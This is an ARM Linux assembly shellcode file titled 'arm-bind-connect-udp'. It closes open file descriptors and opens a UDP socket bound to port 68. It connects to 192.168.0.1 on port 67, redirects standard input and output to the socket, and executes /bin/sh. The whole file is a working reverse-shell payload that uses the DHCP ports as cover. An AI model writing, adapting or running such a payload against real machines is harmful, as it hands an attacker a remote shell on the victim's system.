/*
 * Title: arm-bind-connect-udp
 * Brief: Bind to port 68 on any local address and plug a udp shell
 *        onto to port 67 on 192.168.0.1
 * Author: Daniel Godas-Lopez <gmail account dgodas>
 */

.if 1
	/*
	  close(3), close(4), ..., close(1024)
	 */

	mov %r1, $1024
1:	mov %r0, %r1
	svc 0x00900006
	subs %r1, %r1, $1
	subs %r2, %r1, $3
	bpl 1b
.endif

	/*
	  soc_des = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	 */

	mov %r0, $2		/* AF_INET */
	mov %r1, $2		/* SOCK_DGRAM */
	mov %r2, $17		/* IPPRTOTO_UDP */
	push {%r0, %r1, %r2}
	mov %r0, $1		/* socket */
	mov %r1, %sp
	svc 0x00900066
	add %sp, %sp, $12

	mov %r6, %r0		/* r6 = soc_des */

	/*
	  bind(soc_des, (struct sockaddr*) &serv_addr, sizeof(serv_addr));
	 */

.if 0 /* r0 == r6 already */
	mov %r0, %r6		/* soc_des */
.endif

	mov %r1, $0x44000000
	add %r1, $2		/* port = 68, family = 2 (AF_INET) */
	sub %r2, %r2, %r2	/* addr = 0.0.0.0 */
	push {%r1, %r2}
	mov %r1, %sp		/* pointer to sockaddr_in */
	mov %r2, $16		/* sizeof(struct sockaddr_in) */

	push {%r0, %r1, %r2}
	mov %r0, $2		/* bind */
	mov %r1, %sp
	svc 0x00900066
	add %sp, %sp, $20

	/*
	  connect(soc_des, (struct sockaddr*) &cli_addr, sizeof(cli_addr));
	 */

	mov %r0, %r6		/* soc_des */

	mov %r1, $0x43000000
	add %r1, $2		/* port = 67, family = 2 (AF_INET) */
	mov %r2, $0x1000000
	add %r2, %r2, $0xa800
	add %r2, $0xc0		/* addr = 192.168.0.1 */
	push {%r1, %r2}
	mov %r1, %sp		/* pointer to sockaddr_in */
	mov %r2, $16		/* sizeof(struct sockaddr_in) */

	push {%r0, %r1, %r2}
	mov %r0, $3		/* connect */
	mov %r1, %sp
	svc 0x00900066
	add %sp, %sp, $20

	/*
	  dup2(soc_cli,0);
	  dup2(soc_cli,1);
	  dup2(soc_cli,2);
	 */

	mov %r1, $2
1:	mov %r0, %r6
	svc 0x0090003f
	subs %r1, %r1, $1
	bpl 1b

	/*
	  execve("/bin/sh", parms, env);
	 */

	sub %r1, %sp, $4	/* argv[0] = "sh" */
	sub %r2, %r2, %r2	/* argv[1] = 0x00000000 */
	mov %r3, $0x2f
	mov %r7, $0x62
	add %r3, %r7, lsl $8
	mov %r7, $0x69
	add %r3, %r7, lsl $16
	mov %r7, $0x6e
	add %r3, %r7, lsl $24	/* '/'  'b'  'i'  'n'  */
	mov %r4, $'/'
	mov %r7, $'s'
	add %r4, %r7, lsl $8
	mov %r7, $'h'
	add %r4, %r7, lsl $16	/* '/'  's'  'h'  0x00 */
	mov %r5, $'s'
	mov %r7, $'h'
	add %r5, %r7, lsl $8	/* 's'  'h'  0x00 0x00 */

	push {%r1, %r2, %r3, %r4, %r5}

	add %r0, %sp, $8	/* filename ptr */
	add %r1, %sp, $0	/* argv ptr */
	add %r2, %sp, $4	/* env ptr */

	svc 0x0090000b